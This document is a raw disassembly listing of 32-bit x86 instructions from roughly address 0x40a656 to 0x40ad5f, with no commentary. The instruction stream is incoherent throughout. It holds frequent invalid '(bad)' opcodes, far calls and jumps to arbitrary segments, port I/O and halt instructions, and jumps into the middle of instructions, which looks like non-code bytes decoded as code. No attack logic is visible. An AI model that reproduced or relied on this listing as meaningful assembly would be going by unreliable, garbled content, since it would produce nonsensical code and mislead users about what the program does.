  40a656:	mov    al,0x95
  40a658:	retf   0x521
  40a65b:	jne    0x40a6bc
  40a65d:	sar    DWORD PTR [eax],1
  40a65f:	fiadd  WORD PTR [ebx-0x2fa1f9fd]
  40a665:	or     edx,DWORD PTR [ebx-0x3c07381f]
  40a66b:	retf   0x7264
  40a66e:	mov    ds:0x53f3ebed,eax
  40a673:	dec    edx
  40a674:	xchg   ecx,eax
  40a675:	call   0x6e3b:0xb7e0eea5
  40a67c:	sub    al,0x5b
  40a67e:	inc    edx
  40a67f:	mov    esp,0x4f2150e3
  40a684:	adc    eax,0xcb125427
  40a689:	hlt    
  40a68a:	push   cs
  40a68b:	adc    BYTE PTR [esi+0x40],ah
  40a68e:	inc    esp
  40a68f:	sbb    dl,BYTE PTR [ebx-0x3b]
  40a692:	and    DWORD PTR [eax+0x1a3b805f],eax
  40a698:	xor    ah,dl
  40a69a:	daa    
  40a69b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a69c:	add    BYTE PTR [edx],cl
  40a69e:	dec    esp
  40a69f:	stc    
  40a6a0:	aad    0x19
  40a6a2:	push   edx
  40a6a3:	inc    ebp
  40a6a4:	cli    
  40a6a5:	mov    eax,0xc2bc4927
  40a6aa:	adc    BYTE PTR [ebx],0x64
  40a6ad:	mov    ch,0xca
  40a6af:	test   ebp,edx
  40a6b1:	or     DWORD PTR [ebx+edi*2-0x1ed6a98f],esp
  40a6b8:	ins    BYTE PTR es:[edi],dx
  40a6b9:	out    dx,eax
  40a6ba:	cmp    edi,DWORD PTR [esi]
  40a6bc:	out    0xce,eax
  40a6be:	loope  0x40a6e6
  40a6c0:	jbe    0x40a719
  40a6c2:	cs push esi
  40a6c4:	dec    ecx
  40a6c5:	sar    ch,cl
  40a6c7:	add    BYTE PTR [ecx+ecx*1],0x87
  40a6cb:	jmp    0x40a663
  40a6cd:	pop    eax
  40a6ce:	test   al,0x46
  40a6d0:	xchg   BYTE PTR [edx+0x74],dh
  40a6d3:	arpl   WORD PTR [esi-0x6d],bp
  40a6d6:	popf   
  40a6d7:	pop    edi
  40a6d8:	in     eax,0xc1
  40a6da:	sub    eax,0x9da870fb
  40a6df:	sub    eax,0x7576f461
  40a6e4:	repnz mov ah,0xac
  40a6e7:	dec    esp
  40a6e8:	cmc    
  40a6e9:	imul   ecx,DWORD PTR [ecx-0x6bc97d9b],0x3596b576
  40a6f3:	sbb    eax,0x4d91cb1e
  40a6f8:	test   BYTE PTR [ebp-0x8],bl
  40a6fb:	fisttp DWORD PTR [ebp-0x2c]
  40a6fe:	loop   0x40a729
  40a700:	adc    al,0xaf
  40a702:	dec    esi
  40a703:	or     BYTE PTR [esi+0x2],dl
  40a706:	(bad)  
  40a708:	sbb    DWORD PTR [ebx-0x5a],edi
  40a70b:	adc    eax,0x12b03a32
  40a710:	cmp    DWORD PTR [ebx+0x5d],esi
  40a713:	mov    al,0xfa
  40a715:	or     al,0x77
  40a717:	idiv   BYTE PTR [eax]
  40a719:	sub    DWORD PTR [ecx],edx
  40a71b:	cmp    eax,0x7c95bed8
  40a720:	fcomp  st(3)
  40a722:	jge    0x40a6ee
  40a724:	jl     0x40a785
  40a726:	shl    BYTE PTR [edi+0x76],cl
  40a729:	or     al,BYTE PTR ds:0x5fc6f9d
  40a72f:	add    al,0xe3
  40a731:	sahf   
  40a732:	scas   eax,DWORD PTR es:[edi]
  40a733:	push   ds
  40a734:	cmp    BYTE PTR [ebx],bh
  40a736:	sub    ecx,ebp
  40a738:	sbb    dl,bl
  40a73a:	out    dx,eax
  40a73b:	sub    al,0x29
  40a73d:	xlat   BYTE PTR ds:[ebx]
  40a73e:	xchg   ecx,eax
  40a73f:	out    dx,eax
  40a740:	jne    0x40a7b3
  40a742:	mov    es,WORD PTR [eax+0x7e7ce4b7]
  40a748:	xchg   esp,eax
  40a749:	aaa    
  40a74a:	mov    DWORD PTR [ebx-0x6],0x411b9ad3
  40a751:	outs   dx,BYTE PTR ds:[esi]
  40a752:	fwait
  40a753:	adc    eax,0x42499454
  40a758:	dec    ebp
  40a759:	dec    edx
  40a75a:	nop
  40a75b:	in     al,dx
  40a75c:	mov    al,ds:0xd47dfdd1
  40a761:	lea    ebp,[eax+0x403bd4ab]
  40a767:	or     ch,BYTE PTR [ebx-0x2d]
  40a76a:	jbe    0x40a778
  40a76c:	push   ebp
  40a76d:	dec    ecx
  40a76e:	jbe    0x40a7d0
  40a770:	pop    edx
  40a771:	adc    esp,DWORD PTR [eax-0x3991767d]
  40a777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a778:	sub    ah,BYTE PTR [ebx-0x487ddcd1]
  40a77e:	loop   0x40a782
  40a780:	push   es
  40a781:	xchg   DWORD PTR [eax],edx
  40a783:	gs loop 0x40a784
  40a786:	xchg   edx,eax
  40a787:	data16 shl BYTE PTR [eax+0x489184b9],cl
  40a78e:	in     eax,0xc1
  40a790:	imul   edx,DWORD PTR [eax],0x68
  40a793:	adc    BYTE PTR [esi-0x36e6b98f],bl
  40a799:	lock mov eax,esi
  40a79c:	not    BYTE PTR [esi+0x4a0beeef]
  40a7a2:	popa   
  40a7a3:	aaa    
  40a7a4:	jge    0x40a770
  40a7a6:	mov    al,ds:0x9cf3ddf0
  40a7ab:	scas   eax,DWORD PTR es:[edi]
  40a7ac:	je     0x40a79a
  40a7ae:	popf   
  40a7af:	js     0x40a7a3
  40a7b1:	jecxz  0x40a73e
  40a7b3:	push   ebx
  40a7b4:	les    ebp,FWORD PTR [eax+edi*8-0x64]
  40a7b8:	mov    esi,0xd4f85607
  40a7bd:	push   0x16
  40a7bf:	call   0xa5f8:0xbf552bc
  40a7c6:	rol    cl,cl
  40a7c8:	(bad)  
  40a7c9:	sbb    al,0xb9
  40a7cb:	stos   BYTE PTR es:[edi],al
  40a7cc:	test   DWORD PTR [ebx-0x4a83eaad],eax
  40a7d2:	pop    eax
  40a7d3:	js     0x40a81f
  40a7d5:	lds    ecx,FWORD PTR [edi+0x7e]
  40a7d8:	ds jmp 0x40a778
  40a7db:	out    0xd9,al
  40a7dd:	jno    0x40a7d4
  40a7df:	fwait
  40a7e0:	cmp    dh,BYTE PTR [eax-0x5f]
  40a7e3:	pop    es
  40a7e4:	outs   dx,BYTE PTR ds:[esi]
  40a7e5:	xlat   BYTE PTR ds:[ebx]
  40a7e6:	pop    es
  40a7e7:	cmp    ch,BYTE PTR [edx+0x3956015e]
  40a7ed:	fcomp  QWORD PTR [ebx]
  40a7ef:	shl    BYTE PTR [edi],cl
  40a7f1:	or     DWORD PTR [esi],ebx
  40a7f3:	and    BYTE PTR [ebp+eax*4+0x31caa81d],dl
  40a7fa:	das    
  40a7fb:	and    al,0x14
  40a7fd:	mov    dl,0xc5
  40a7ff:	jo     0x40a7e8
  40a801:	cmp    eax,esi
  40a803:	jg     0x40a879
  40a805:	sar    DWORD PTR [ebx],cl
  40a807:	aaa    
  40a808:	push   cs
  40a809:	sbb    bh,BYTE PTR [eax-0x56]
  40a80c:	stc    
  40a80d:	test   DWORD PTR [eax],0x1ddb4cbd
  40a813:	and    esi,DWORD PTR [edi]
  40a815:	ja     0x40a871
  40a817:	jge    0x40a80d
  40a819:	pop    es
  40a81a:	int    0xed
  40a81c:	push   ebx
  40a81d:	scas   eax,DWORD PTR es:[edi]
  40a81e:	repnz call 0x6e99:0x49da
  40a825:	fimul  WORD PTR [ebx+ecx*8-0x7f681a51]
  40a82c:	sbb    eax,0xb5de74a5
  40a831:	pop    esp
  40a832:	push   edx
  40a833:	ja     0x40a8a2
  40a835:	scas   eax,DWORD PTR es:[edi]
  40a836:	stos   BYTE PTR es:[edi],al
  40a837:	ins    DWORD PTR es:[edi],dx
  40a838:	or     al,0x65
  40a83a:	mov    eax,DWORD PTR [eax]
  40a83c:	jo     0x40a7fb
  40a83e:	xchg   edx,eax
  40a83f:	dec    ebx
  40a840:	push   esi
  40a841:	jnp    0x40a811
  40a843:	test   BYTE PTR [esi+0x6],0xb3
  40a847:	xchg   edi,eax
  40a848:	inc    eax
  40a849:	dec    edi
  40a84a:	lds    edi,FWORD PTR [ecx]
  40a84c:	cmp    eax,0x9850617d
  40a851:	pop    eax
  40a852:	adc    cl,bh
  40a854:	stos   BYTE PTR es:[edi],al
  40a855:	inc    DWORD PTR [edi+0x101de2b]
  40a85b:	ja     0x40a827
  40a85d:	(bad)  
  40a85e:	mov    eax,ds:0x27e529f7
  40a863:	mov    ah,0xa9
  40a865:	cmp    dl,BYTE PTR [edx+0xb]
  40a868:	mov    cl,0xbd
  40a86a:	adc    esi,DWORD PTR [edx]
  40a86c:	add    al,0x9c
  40a86e:	adc    ebx,DWORD PTR [esi-0xa9bbe1a]
  40a874:	repz sub al,0x3
  40a877:	ins    BYTE PTR es:[edi],dx
  40a878:	ss push ebx
  40a87a:	mov    al,ds:0xa4316372
  40a87f:	mov    ebp,0x2142c363
  40a884:	or     eax,0xa5f0d7d9
  40a889:	mov    WORD PTR [esp+esi*1+0x5190adf1],es
  40a890:	shr    DWORD PTR [edi+edx*4],1
  40a893:	push   esp
  40a894:	ins    DWORD PTR es:[edi],dx
  40a895:	jl     0x40a865
  40a897:	aaa    
  40a898:	cmp    ax,0x693f
  40a89c:	adc    al,dl
  40a89e:	lock out dx,eax
  40a8a0:	loopne 0x40a850
  40a8a2:	idiv   BYTE PTR [ebx+edi*2]
  40a8a5:	cld    
  40a8a6:	ret    
  40a8a7:	add    dh,bl
  40a8a9:	js     0x40a900
  40a8ab:	retf   
  40a8ac:	(bad)  
  40a8ad:	sar    ebp,1
  40a8af:	scas   al,BYTE PTR es:[edi]
  40a8b0:	(bad)
  40a8b4:	fist   WORD PTR [esi-0x2f]
  40a8b7:	xchg   esp,eax
  40a8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8b9:	sub    ecx,DWORD PTR [ecx]
  40a8bb:	add    esp,ebp
  40a8bd:	jecxz  0x40a8aa
  40a8bf:	cmp    BYTE PTR [ecx+0x1c],ch
  40a8c2:	mul    DWORD PTR [esi]
  40a8c4:	and    al,ah
  40a8c6:	js     0x40a8ed
  40a8c8:	pop    ds
  40a8c9:	xor    ebx,eax
  40a8cb:	xlat   BYTE PTR ds:[ebx]
  40a8cc:	push   ss
  40a8cd:	leave  
  40a8ce:	add    eax,0x7513c0ec
  40a8d3:	pop    eax
  40a8d4:	adc    ch,dh
  40a8d6:	pop    edx
  40a8d7:	mov    al,ds:0xc0309b4f
  40a8dc:	into   
  40a8dd:	ins    DWORD PTR es:[edi],dx
  40a8de:	call   0xacef372f
  40a8e3:	xchg   edi,eax
  40a8e4:	push   ecx
  40a8e5:	push   edx
  40a8e6:	out    0x43,eax
  40a8e8:	stos   DWORD PTR es:[edi],eax
  40a8e9:	dec    esi
  40a8ea:	fcomp  DWORD PTR [ebp-0x5757a58d]
  40a8f0:	rcl    DWORD PTR [esi+0x4e],1
  40a8f3:	mov    es,WORD PTR [ebp+0x596cc9bc]
  40a8f9:	xor    eax,0x6ba57a24
  40a8fe:	add    bh,ch
  40a900:	pop    eax
  40a901:	push   esp
  40a902:	lea    ebp,[ecx+edx*2+0x24]
  40a906:	adc    eax,0xe7b208ea
  40a90b:	xchg   esp,eax
  40a90c:	inc    ecx
  40a90d:	mov    ch,0xcd
  40a90f:	adc    ah,BYTE PTR [ebp-0x40fce153]
  40a915:	repz add eax,edx
  40a918:	in     eax,0xa7
  40a91a:	les    edi,FWORD PTR [ecx]
  40a91c:	sub    DWORD PTR [ecx+0x1eda0a67],0x7ca8dd44
  40a926:	jae    0x40a934
  40a928:	xchg   edx,eax
  40a929:	push   0x3
  40a92b:	mov    ebp,DWORD PTR [esi-0x20]
  40a92e:	mov    al,ds:0x3ade66b1
  40a933:	mov    bl,0x4
  40a935:	stos   DWORD PTR es:[edi],eax
  40a936:	push   esp
  40a937:	pop    ebx
  40a938:	das    
  40a939:	sbb    dl,BYTE PTR [edx+0x62e4d2c8]
  40a93f:	fist   DWORD PTR [edi-0x15]
  40a942:	pop    ebx
  40a943:	inc    esp
  40a944:	adc    BYTE PTR [edx-0x21],dl
  40a947:	adc    al,0x1
  40a949:	aam    0xb5
  40a94b:	cdq    
  40a94c:	(bad)  
  40a94d:	ins    BYTE PTR es:[edi],dx
  40a94e:	dec    ecx
  40a94f:	fwait
  40a950:	xor    DWORD PTR [eax-0x2c81727a],ebp
  40a956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a957:	xchg   ecx,eax
  40a958:	in     eax,dx
  40a959:	push   ds
  40a95a:	xchg   ebp,eax
  40a95b:	(bad)  
  40a95c:	sbb    DWORD PTR [ebx-0x4c0d51c6],ebx
  40a962:	mov    dl,0x52
  40a964:	or     eax,0xcd1b83ad
  40a969:	es clc 
  40a96b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40a96d:	cwde   
  40a96e:	cmp    al,0xaa
  40a970:	inc    esi
  40a971:	xor    al,0x18
  40a973:	jecxz  0x40a9c6
  40a975:	add    bl,cl
  40a977:	inc    ebx
  40a978:	push   ecx
  40a979:	push   0xffffffa6
  40a97b:	fmulp  st(7),st
  40a97d:	fwait
  40a97e:	pop    eax
  40a97f:	mov    ah,0x22
  40a981:	inc    ecx
  40a982:	pop    edx
  40a983:	inc    eax
  40a984:	xor    BYTE PTR ds:0xe4b0ce97,bh
  40a98a:	loop   0x40a951
  40a98c:	dec    esi
  40a98d:	add    BYTE PTR [eax-0x7684f16f],cl
  40a993:	mov    dh,0xcc
  40a995:	dec    ebp
  40a996:	test   ah,bh
  40a998:	bnd jl 0x40aa05
  40a99b:	pop    eax
  40a99c:	add    esi,DWORD PTR [ecx+0x38]
  40a99f:	mov    al,0x27
  40a9a1:	hlt    
  40a9a2:	adc    al,0xfe
  40a9a4:	imul   edx,DWORD PTR [ebx-0x2d],0x2828a624
  40a9ab:	and    ch,BYTE PTR [ebp-0x395dfa89]
  40a9b1:	in     al,dx
  40a9b2:	mov    ds,WORD PTR [ebx+0x6fb034f9]
  40a9b8:	cmp    eax,0x74a1e737
  40a9bd:	iret   
  40a9be:	cli    
  40a9bf:	ror    DWORD PTR [ecx+0x58],1
  40a9c2:	mov    ch,0x48
  40a9c4:	out    0x86,eax
  40a9c6:	inc    esp
  40a9c7:	mov    bl,ch
  40a9c9:	gs dec ebx
  40a9cb:	pop    es
  40a9cc:	rcr    dl,1
  40a9ce:	rcl    DWORD PTR [edx],1
  40a9d0:	arpl   si,cx
  40a9d2:	jecxz  0x40a98e
  40a9d4:	lods   eax,DWORD PTR ds:[esi]
  40a9d5:	xchg   esi,eax
  40a9d6:	test   al,0x3b
  40a9d8:	rol    BYTE PTR [ebx+esi*8+0x1a],cl
  40a9dc:	xor    ebx,DWORD PTR [ebp-0x4d]
  40a9df:	add    eax,0xf428e008
  40a9e4:	fld    DWORD PTR [ebx-0x4e98161f]
  40a9ea:	xchg   al,bh
  40a9ec:	dec    edi
  40a9ed:	pop    ds
  40a9ee:	push   0xffffffad
  40a9f0:	push   edx
  40a9f1:	mov    esi,0x860f9352
  40a9f6:	inc    ecx
  40a9f7:	xchg   esp,eax
  40a9f8:	jbe    0x40a9cb
  40a9fa:	sub    ecx,DWORD PTR [ebx+0x411f7e8f]
  40aa00:	scas   eax,DWORD PTR es:[edi]
  40aa01:	stos   DWORD PTR es:[edi],eax
  40aa02:	cs das 
  40aa04:	leave  
  40aa05:	sahf   
  40aa06:	out    0x25,eax
  40aa08:	sbb    ebp,DWORD PTR [ebp+edx*1+0x57]
  40aa0c:	mov    ds:0x9ab5b794,al
  40aa11:	(bad)  
  40aa12:	dec    ecx
  40aa13:	or     BYTE PTR [edx+0x74445734],cl
  40aa19:	inc    BYTE PTR [ebx+ebx*2+0x3]
  40aa1d:	aam    0xf1
  40aa1f:	int    0x3e
  40aa21:	clc    
  40aa22:	aam    0xe4
  40aa24:	clc    
  40aa25:	in     al,0xf0
  40aa27:	cmp    edx,DWORD PTR [edx]
  40aa29:	push   0x56
  40aa2b:	stos   DWORD PTR es:[edi],eax
  40aa2c:	cmc    
  40aa2d:	xchg   ecx,eax
  40aa2e:	jl     0x40a9f5
  40aa30:	or     eax,0x6973823b
  40aa35:	xchg   edi,eax
  40aa36:	and    DWORD PTR [eax-0x1049efe9],esp
  40aa3c:	adc    ebp,DWORD PTR [ecx]
  40aa3e:	xor    bl,BYTE PTR [eax+0x1d5732b8]
  40aa44:	(bad)  
  40aa45:	out    0x9,al
  40aa47:	fwait
  40aa48:	cwde   
  40aa49:	fs jp  0x40a9f9
  40aa4c:	jge    0x40aa1c
  40aa4e:	popf   
  40aa4f:	lods   eax,DWORD PTR ds:[esi]
  40aa50:	mov    ebx,0x7979c937
  40aa55:	fwait
  40aa56:	js     0x40a9ff
  40aa58:	xchg   DWORD PTR [ebx+ebp*8+0xe],ebx
  40aa5c:	mov    cl,0x94
  40aa5e:	xchg   ecx,eax
  40aa5f:	jb     0x40aace
  40aa61:	cmp    eax,0x47cd2f60
  40aa66:	inc    ebx
  40aa67:	and    al,0xd0
  40aa69:	dec    eax
  40aa6a:	vcmpps xmm1,xmm1,XMMWORD PTR [ecx],0xc0
  40aa6f:	loope  0x40aa88
  40aa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa72:	gs neg ch
  40aa75:	scas   al,BYTE PTR es:[edi]
  40aa76:	aaa    
  40aa77:	and    eax,0xe368f686
  40aa7c:	mov    ch,0xee
  40aa7e:	push   ecx
  40aa7f:	bound  eax,QWORD PTR [edx+0x31]
  40aa82:	mov    edx,ss
  40aa84:	repz cmp BYTE PTR [ecx+0x69],al
  40aa88:	lods   eax,DWORD PTR ds:[esi]
  40aa89:	iret   
  40aa8a:	dec    ecx
  40aa8b:	push   DWORD PTR [edi+0x18]
  40aa8e:	lods   al,BYTE PTR ds:[esi]
  40aa8f:	js     0x40aac5
  40aa91:	xchg   esp,ebp
  40aa93:	nop
  40aa94:	clc    
  40aa95:	xchg   edi,eax
  40aa96:	dec    edx
  40aa97:	pusha  
  40aa98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa99:	add    al,0xa4
  40aa9b:	fs jns 0x40aa31
  40aa9e:	das    
  40aa9f:	bound  ebx,QWORD PTR [ebx]
  40aaa1:	inc    ebx
  40aaa2:	lock xchg DWORD PTR [edx+0x42],eax
  40aaa6:	fcmovb st,st(7)
  40aaa8:	in     eax,dx
  40aaa9:	inc    edi
  40aaaa:	cwde   
  40aaab:	adc    ch,BYTE PTR [eax+0x15a6]
  40aab1:	outs   dx,DWORD PTR ds:[esi]
  40aab2:	stos   DWORD PTR es:[edi],eax
  40aab3:	ins    BYTE PTR es:[edi],dx
  40aab4:	icebp  
  40aab5:	imul   ecx,DWORD PTR [edx+0x61],0x3bec8ca2
  40aabc:	pop    ss
  40aabd:	xor    bl,BYTE PTR [ebx+0x3a]
  40aac0:	dec    edi
  40aac1:	fs xchg esi,eax
  40aac3:	adc    bl,BYTE PTR [edi+0x34e38c14]
  40aac9:	jecxz  0x40aafb
  40aacb:	mov    edx,0x50e735dc
  40aad0:	and    DWORD PTR [edx+0xa],ebp
  40aad3:	test   edi,0x66ff962
  40aad9:	into   
  40aada:	enter  0xc33d,0xd0
  40aade:	aaa    
  40aadf:	je     0x40aab3
  40aae1:	mov    edi,0xe3f15ddb
  40aae6:	out    dx,al
  40aae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aae8:	loop   0x40aa7e
  40aaea:	loope  0x40ab6b
  40aaec:	cli    
  40aaed:	in     eax,dx
  40aaee:	and    eax,0x7cd133ae
  40aaf3:	popa   
  40aaf4:	ror    BYTE PTR [ecx+0x23],1
  40aaf7:	jbe    0x40ab22
  40aaf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aafa:	mov    edi,0x57e152e7
  40aaff:	xor    bh,0xcc
  40ab02:	in     al,dx
  40ab03:	adc    dl,BYTE PTR ds:0x43c86e53
  40ab09:	ror    BYTE PTR [esi+eiz*4],1
  40ab0c:	test   edi,eax
  40ab0e:	xor    al,0xc7
  40ab10:	aaa    
  40ab11:	pop    esp
  40ab12:	mov    edx,DWORD PTR [edx-0x2d17152e]
  40ab18:	scas   al,BYTE PTR es:[edi]
  40ab19:	mov    bh,BYTE PTR [ecx]
  40ab1b:	cli    
  40ab1c:	add    al,0x6b
  40ab1e:	loope  0x40ab60
  40ab20:	jmp    0x40ab2b
  40ab22:	pop    ebx
  40ab23:	xchg   esp,eax
  40ab24:	mov    bh,0x64
  40ab26:	jmp    0x40ab6b
  40ab28:	test   ecx,esp
  40ab2a:	jecxz  0x40ab47
  40ab2c:	mov    edi,DWORD PTR [ecx+0x40]
  40ab2f:	push   0xffffffef
  40ab31:	xchg   edx,eax
  40ab32:	(bad)  
  40ab33:	addr16 fwait
  40ab35:	and    edx,DWORD PTR [eax+0x39fd8320]
  40ab3b:	aaa    
  40ab3c:	sub    DWORD PTR [ecx],esi
  40ab3e:	xchg   edx,eax
  40ab3f:	xchg   esi,eax
  40ab40:	xor    ecx,DWORD PTR [ebx+eiz*1-0x53]
  40ab44:	mov    ecx,0xafeae0fb
  40ab49:	add    eax,0xf9968e58
  40ab4e:	stc    
  40ab4f:	jnp    0x40ab7e
  40ab51:	sbb    BYTE PTR [ebp-0x7532482b],bl
  40ab57:	cmp    DWORD PTR [ebx],0x54e77a8c
  40ab5d:	aaa    
  40ab5e:	sbb    eax,0xdad69b08
  40ab63:	push   edx
  40ab64:	fmul   QWORD PTR [esi+ebx*1]
  40ab67:	cmovno ecx,DWORD PTR [edx]
  40ab6a:	push   eax
  40ab6b:	test   BYTE PTR [eax],bl
  40ab6d:	imul   esp,DWORD PTR [eax+ebx*8-0xb6a52b0],0x75
  40ab75:	sub    ebx,DWORD PTR [edx]
  40ab77:	sbb    eax,0x341d1836
  40ab7c:	sar    BYTE PTR [edx-0x4178b268],1
  40ab82:	stc    
  40ab83:	mov    eax,ds:0xc219fe55
  40ab88:	in     al,0x68
  40ab8a:	or     bh,bl
  40ab8c:	inc    edx
  40ab8d:	jae    0x40ab8e
  40ab8f:	inc    ebp
  40ab90:	sub    BYTE PTR [ebx-0x453ccd84],0x2b
  40ab97:	adc    esi,DWORD PTR [eax-0x20a3e41b]
  40ab9d:	sbb    al,0x71
  40aba0:	cmp    al,0x16
  40aba2:	push   es
  40aba3:	imul   BYTE PTR [ebx-0x65]
  40aba6:	mov    cs,edx
  40aba8:	xor    ebp,edx
  40abaa:	shl    dl,0xf2
  40abad:	xor    BYTE PTR [eax-0x27],0x12
  40abb1:	icebp  
  40abb2:	iret   
  40abb3:	enter  0x8021,0x32
  40abb7:	jns    0x40abd3
  40abb9:	cmp    eax,edi
  40abbb:	pop    ss
  40abbc:	stc    
  40abbd:	dec    ebp
  40abbe:	xchg   ecx,eax
  40abbf:	or     DWORD PTR [ecx],eax
  40abc1:	addr16 jno 0x40ac1d
  40abc4:	scas   eax,DWORD PTR es:[edi]
  40abc5:	out    0xf2,al
  40abc7:	xor    al,0x4d
  40abc9:	(bad)  
  40abca:	and    DWORD PTR [eax],ecx
  40abcc:	(bad)  
  40abcd:	aam    0xf3
  40abcf:	(bad)  
  40abd0:	repz sbb esp,DWORD PTR [edx-0xa]
  40abd4:	add    edx,DWORD PTR [esi-0x29]
  40abd7:	cs pop esp
  40abd9:	loop   0x40ac05
  40abdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abdc:	xor    dl,BYTE PTR [ecx-0x2]
  40abdf:	add    DWORD PTR [eax],esp
  40abe1:	xor    eax,0x684d3f14
  40abe6:	adc    eax,0xe2a67b78
  40abeb:	and    dh,bl
  40abed:	repz shr al,1
  40abf0:	test   al,0xf2
  40abf2:	or     al,0xde
  40abf4:	test   al,0x1e
  40abf6:	xchg   esi,eax
  40abf7:	jp     0x40abac
  40abf9:	imul   edi,edx,0x3ed2c98
  40abff:	imul   ecx,DWORD PTR ds:0xecea4242,0x73
  40ac06:	xchg   esi,eax
  40ac07:	add    ch,BYTE PTR ds:0x27fe6bbc
  40ac0d:	iret   
  40ac0e:	loop   0x40ac61
  40ac10:	inc    esi
  40ac11:	cmp    DWORD PTR [edx-0x6b],0x2643902d
  40ac18:	test   DWORD PTR [esi],edi
  40ac1a:	test   BYTE PTR [ebx+ecx*4-0x21ab2fcf],dh
  40ac21:	retf   
  40ac22:	and    DWORD PTR [edi-0x7b76b688],edi
  40ac28:	xchg   BYTE PTR [esi-0x4d5b2c2b],bh
  40ac2e:	xchg   BYTE PTR [edi+0x72],dl
  40ac31:	pop    esi
  40ac32:	loop   0x40acaa
  40ac34:	aad    0x10
  40ac36:	push   es
  40ac37:	out    dx,al
  40ac38:	dec    ebx
  40ac39:	scas   al,BYTE PTR es:[edi]
  40ac3a:	or     BYTE PTR [esi-0x28],bl
  40ac3d:	inc    eax
  40ac3e:	xchg   edx,eax
  40ac3f:	mov    eax,DWORD PTR ds:0x497ea866
  40ac45:	jbe    0x40ac4a
  40ac47:	mov    eax,0xb02d510c
  40ac4c:	pop    ss
  40ac4d:	iret   
  40ac4e:	jo     0x40ac19
  40ac50:	sbb    edx,esi
  40ac52:	mov    esi,0x7a5a2e42
  40ac57:	std    
  40ac58:	std    
  40ac59:	xchg   esi,eax
  40ac5a:	in     al,dx
  40ac5b:	dec    DWORD PTR [edi]
  40ac5d:	push   eax
  40ac5e:	add    edx,DWORD PTR [ebp-0x1dad94a6]
  40ac64:	mov    eax,cs
  40ac66:	data16 test dl,bh
  40ac69:	lods   eax,DWORD PTR ds:[esi]
  40ac6a:	cmp    BYTE PTR [eax],bh
  40ac6c:	cdq    
  40ac6d:	pop    edx
  40ac6e:	xchg   ebx,eax
  40ac6f:	sub    BYTE PTR ds:0xe5d1a987,bh
  40ac75:	jg     0x40ac78
  40ac77:	aaa    
  40ac78:	test   eax,edx
  40ac7a:	int    0xdb
  40ac7c:	addr16 jmp 0x40acb5
  40ac7f:	and    al,ah
  40ac81:	push   cs
  40ac82:	fwait
  40ac83:	mov    dh,0x6e
  40ac85:	jmp    0x2b8c:0x8013a13a
  40ac8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac8d:	pop    esi
  40ac8e:	ins    DWORD PTR es:[edi],dx
  40ac8f:	jmp    0xd297:0xd0c0b3c9
  40ac96:	add    bh,BYTE PTR [eax+0x4d]
  40ac99:	scas   eax,DWORD PTR es:[edi]
  40ac9a:	fs push edi
  40ac9c:	add    dh,BYTE PTR [ebx+0x4282d608]
  40aca2:	adc    BYTE PTR [edi],cl
  40aca4:	sbb    eax,ebx
  40aca6:	or     al,BYTE PTR [ecx+esi*8]
  40aca9:	inc    esp
  40acaa:	add    DWORD PTR [ecx-0x38],edi
  40acad:	inc    edi
  40acae:	xor    al,0x1b
  40acb0:	cs jge 0x40acb7
  40acb3:	xor    al,0x95
  40acb5:	push   ss
  40acb6:	mov    bh,BYTE PTR ds:0xa91bcddc
  40acbc:	shr    DWORD PTR [eax-0x77d6794c],cl
  40acc2:	loopne 0x40acc8
  40acc4:	pop    es
  40acc5:	mov    eax,0x7e8684dd
  40acca:	lods   eax,DWORD PTR ds:[esi]
  40accb:	clc    
  40accc:	retf   
  40accd:	push   edi
  40acce:	outs   dx,DWORD PTR ds:[esi]
  40accf:	repnz fs in al,0x18
  40acd3:	xlat   BYTE PTR fs:[ebx]
  40acd5:	mov    esi,0x25deba5b
  40acda:	call   0xdf3d:0x2e56bf6b
  40ace1:	dec    eax
  40ace2:	pop    edx
  40ace3:	jmp    0x98549c5
  40ace8:	sar    BYTE PTR [ebp+0xaddacbc],1
  40acee:	imul   ebx,DWORD PTR [esi+0xf],0xfffffffe
  40acf2:	mov    edx,0x4536c8d1
  40acf7:	push   ebp
  40acf8:	scas   eax,DWORD PTR es:[edi]
  40acf9:	shl    BYTE PTR [ebx+esi*8-0x64e523be],1
  40ad00:	pop    edx
  40ad01:	xor    ch,BYTE PTR [esi+ecx*2-0x35]
  40ad05:	outs   dx,DWORD PTR ds:[esi]
  40ad06:	inc    edi
  40ad07:	mov    ebx,0x5ea81d5b
  40ad0c:	fwait
  40ad0d:	xchg   ebp,eax
  40ad0e:	int3   
  40ad0f:	outs   dx,BYTE PTR ds:[esi]
  40ad10:	rep outs dx,DWORD PTR ds:[esi]
  40ad12:	adc    eax,0x6f0418e5
  40ad17:	fwait
  40ad18:	rol    BYTE PTR [eax*4-0x2273c0df],cl
  40ad1f:	jg     0x40ad98
  40ad21:	stos   DWORD PTR es:[edi],eax
  40ad22:	jb     0x40ad24
  40ad24:	or     eax,0xb1a2026c
  40ad29:	inc    esi
  40ad2a:	retf   
  40ad2b:	and    BYTE PTR [ebx-0x4d43f6b8],bh
  40ad31:	jecxz  0x40ad7e
  40ad33:	pop    ds
  40ad34:	and    DWORD PTR [eax],esp
  40ad36:	xchg   esp,eax
  40ad37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad38:	adc    ebp,DWORD PTR [esi]
  40ad3a:	shr    DWORD PTR [esi],0xe
  40ad3d:	sbb    BYTE PTR [eax+0x66779f91],bl
  40ad43:	xlat   BYTE PTR ds:[ebx]
  40ad44:	or     ch,BYTE PTR [esi]
  40ad46:	and    al,0x9d
  40ad48:	cmp    ebp,DWORD PTR [ebp+0x4a897abc]
  40ad4e:	push   es
  40ad4f:	into   
  40ad50:	fwait
  40ad51:	push   esi
  40ad52:	pop    eax
  40ad53:	arpl   WORD PTR [esi-0xcb6d4d6],di
  40ad59:	add    edi,DWORD PTR [edx+0x75]
  40ad5c:	push   ebp
  40ad5d:	outs   dx,DWORD PTR ds:[esi]
  40ad5e:	(bad)  
  40ad5f:	frstor [edi-0x26]
